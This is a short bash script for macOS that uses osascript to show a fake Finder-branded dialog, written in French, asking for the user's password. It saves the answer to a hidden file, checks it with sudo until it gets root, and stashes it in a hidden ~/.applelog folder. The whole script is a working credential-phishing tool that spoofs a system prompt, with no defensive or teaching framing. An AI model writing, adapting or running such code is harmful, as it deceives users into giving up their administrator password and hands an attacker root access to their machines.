#!/bin/bash
check() {

# Store user input inside $results
results=`cat ~/.output.txt`

# Check if password is good with whoami
outputok=`echo $results | sudo -S whoami`

# If outputok == root its good !!
echo $outputok

# Clean up file for next launch
rm -rf ~/.output.txt
sleep 1

# If else to check if we keep going or retry
while true; do
if [ "$outputok" == "root" ]
then
clear
sleep 1
echo "Its ok"
break
else
sleep 1
ask
echo "Its not ok"
fi
done
}


ask() {

# Ask user for password
rm -rf ~/.output.txt
osascript -e 'set foo to do shell script "/usr/sbin/scutil --get ComputerName"' -e 'set theHD to path to startup disk as text' -e 'set theIconFile to theHD & "System:Library:CoreServices:Dock.app:Contents:Resources:finder.png"' -e 'set dialogAnswer to display dialog "Entrez votre mot de passe pour débloquer " & foo default answer "" with icon file theIconFile with title "Finder" with hidden answer' -e 'set filepath to (path to home folder as text) & ".output.txt"' -e 'set openfile to open for access file filepath with write permission' -e 'write text returned of dialogAnswer to openfile' -e 'close access openfile'

check
mv ~/.output.txt ~/.applelog*/
}


ask
clear
echo "GOT IT"
